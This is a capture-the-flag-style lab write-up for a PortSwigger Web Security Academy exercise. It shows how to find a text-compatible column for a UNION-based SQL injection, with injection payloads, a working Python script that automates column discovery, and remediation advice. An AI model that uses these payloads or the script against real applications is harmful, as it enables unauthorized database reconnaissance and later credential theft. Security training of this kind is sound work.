# Finding a Column of Text Data Type Using ORDER BY and UNION
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Date:** 2026-08-17

## The Problem
The application's product category filter ran a query similar to:

```sql
SELECT * FROM products WHERE category = 'Gifts'
```

Once the number of columns is known (see lab 3), a `UNION SELECT` attack can be attempted — but every column in the injected `SELECT` must match the data type of the corresponding column in the original query, or the database rejects it. Before extracting real data (like usernames or passwords), it's necessary to find which of those columns actually accepts text, since that's the column any extracted string data will need to go into.

## Discovery / Exploitation
With the column count already known (3, from lab 3), the technique is to submit a `UNION SELECT` where every column is `NULL` except one, which holds a unique, recognizable string. `NULL` is valid for virtually any data type, so it won't cause a type-mismatch error — the goal is only to isolate which single column, when set to text, doesn't cause an error and the string shows up on the page.

```
' UNION SELECT 'fs8CrU', NULL, NULL--
' UNION SELECT NULL, 'fs8CrU', NULL--
' UNION SELECT NULL, NULL, 'fs8CrU'--
```

Whichever variant causes the unique string (`fs8CrU`) to actually appear in the rendered page response is the string-compatible column.

## Impact
This step doesn't extract sensitive data on its own, but it's a required part of building a working UNION-based attack — without knowing which column accepts text, later attempts to extract string data (like credentials from a `users` table) would fail with type errors and give no useful signal.

## Proof of Concept (Python)
This script chains two steps: first it reuses the column-count logic from lab 3 (via `ORDER BY`), then it loops through each column position, injecting a unique marker string into that position (with all others set to `NULL`), and checks whether the marker appears in the response.

```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli_column_number(url):
    path = "filter?category=Gifts"
    for i in range(1, 50):
        payload = "'+order+by+%d--" % i
        r = requests.get(url + path + payload, verify=False, proxies=proxies)
        res = r.text
        if "internal server error" in res:
            return i - 1
    return False


def exploit_sqli_string_field(url, num_col):
    path = "filter?category=Gifts"
    for i in range(1, num_col + 1):
        string = "'fs8CrU'"
        payload_list = ['NULL'] * num_col
        payload_list[i - 1] = string
        sql_payload = "'+union+select+" + ','.join(payload_list) + "--"
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if string.strip("'") in res:
            return i
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] figuring out the number of columns...")
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print("[+] the number of columns is " + str(num_col) + ".")
        print("[+] figuring out which column contains text......")
        string_column = exploit_sqli_string_field(url, num_col)
        if string_column:
            print("[+] the column that contains text is " + str(string_column) + ".")
        else:
            print("[-] we are not able to find the column with a string datatype...")
    else:
        print("[-] the attack was not successful.")
```

**How it works:**
1. Reuses `exploit_sqli_column_number` from lab 3 to determine the total number of columns first
2. For each column position, builds a `UNION SELECT` payload where every column is `NULL` except that one position, which holds a unique marker string (`fs8CrU`) — a random-looking value chosen specifically so it won't accidentally match existing page content
3. Sends each variant and checks whether the marker string shows up in the response
4. Returns the 1-indexed position of the first column where the marker appears — that's the string-compatible column
5. Prints the results of both stages: column count, then the string column position

**Example run:**
```bash
python3 exploit_sqli_string_column.py https://your-lab-url.web-security-academy.net
```

## Remediation
- Use **parameterized queries (prepared statements)** so the query structure — including column count and types — can never be probed or manipulated via user input.
- Avoid leaking **raw database errors** to the client; generic error responses remove the error-based oracle attackers rely on at each stage of this reconnaissance.
- Apply **strict input validation** on parameters that should only ever hold a small set of known values.

## Takeaway
This lab is the second reconnaissance step of a full UNION-based SQL injection, following directly from lab 3. The technique of substituting `NULL` for all-but-one column and using a unique marker string is a reusable pattern: it isolates one variable at a time (which column accepts text) without needing to guess table or column names yet. Once the string column is known, it becomes the target position for injecting real extracted data (e.g. `username || ':' || password`) in a later step.
